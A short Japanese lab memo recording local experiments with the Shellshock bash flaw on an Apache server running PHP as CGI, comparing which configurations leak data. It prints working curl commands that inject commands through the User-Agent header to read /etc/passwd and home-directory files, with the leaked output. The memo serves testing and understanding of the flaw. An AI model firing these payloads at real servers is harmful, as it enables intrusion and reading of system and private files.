---
Keywords: CLI,こっそり置いておく
Copyright: (C) 2017 Ryuichi Ueda
---

# 実験メモ
何の実験かは・・・あれですね・・・。<br />
<br />
こういうファイルを準備。<br />
[bash]<br />
[root\@localhost httpd]# cat /var/www/html/index.php <br />
#!/usr/bin/env php<br />
<br />
&lt;?php<br />
	system('date');<br />
?&gt;<br />
[/bash]<br />
<br />
<!--more--><br />
<br />
httpd.confのOptionsのところにExecCGIを追加し、<br />
下にAddHandlerを書く。<br />
<br />
[bash]<br />
 Options Indexes FollowSymLinks ExecCGI<br />
 AddHandler cgi-script php<br />
[/bash]<br />
<br />
ホームの下にファイルを準備<br />
[bash]<br />
[ueda\@localhost ~]$ ls -l mysecret <br />
-rw-rw-r--. 1 ueda ueda 13 10月 3 20:07 2014 mysecret<br />
[ueda\@localhost ~]$ cat mysecret <br />
私の秘密<br />
[/bash]<br />
<br />
外側からcurlでつっつく。ポートフォワードでhttp://localhost:8888からつっつく。<br />
[bash]<br />
uedambp:~ ueda$ curl -A '() { :; }; /bin/cat /home/ueda/*' http://localhost:8888/index.php<br />
[/bash]<br />
<br />
ログを確認。パーミッションで守られている。<br />
[bash]<br />
[root\@localhost httpd]# tail error_log <br />
...<br />
[Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] /bin/cat: <br />
[Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] /home/ueda/*<br />
[Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] : Permission denied<br />
[Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] <br />
[/bash]<br />
<br />
もう一度突っつく。別のものを。<br />
[bash]<br />
uedambp:~ ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php<br />
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br />
ueda:x:500:500::/home/ueda:/bin/bash<br />
apache:x:48:48:Apache:/var/www:/sbin/nologin<br />
[/bash]<br />
守られていない・・・。<br />
<br />
<br />
今度はhttpd.confから追記部分をもう一度削り、index.phpを次のように書き換える。<br />
[bash]<br />
[root\@localhost httpd]# cat /var/www/html/index.php <br />
&lt;?php<br />
	system('date');<br />
?&gt;<br />
[/bash]<br />
<br />
もう一度突っつく。<br />
[bash]<br />
uedambp:~ ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php<br />
Fri Oct 3 20:27:38 JST 2014<br />
[/bash]<br />
大丈夫。<br />
<br />
もう一度CGIモードで。こんなコード。<br />
[bash]<br />
[root\@localhost httpd]# cat /var/www/html/index.php <br />
#!/usr/bin/php<br />
<br />
&lt;?php<br />
	print(&quot;hoge\\n&quot;);<br />
?&gt;<br />
[/bash]<br />
<br />
[bash]<br />
uedambp:IPSJ_SHELLSHOCK ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php 2&gt; /dev/null<br />
hoge<br />
[/bash]<br />
<br />
大丈夫。<br />
<br />
これは・・・<br />
[bash]<br />
[root\@localhost httpd]# cat /var/www/html/index.php <br />
#!/usr/bin/php<br />
<br />
&lt;?php<br />
	system(&quot;date&quot;);<br />
?&gt;<br />
[/bash]<br />
<br />
ダメ。<br />
[bash]<br />
uedambp:IPSJ_SHELLSHOCK ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php 2&gt; /dev/null<br />
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br />
ueda:x:500:500::/home/ueda:/bin/bash<br />
apache:x:48:48:Apache:/var/www:/sbin/nologin<br />
[/bash]
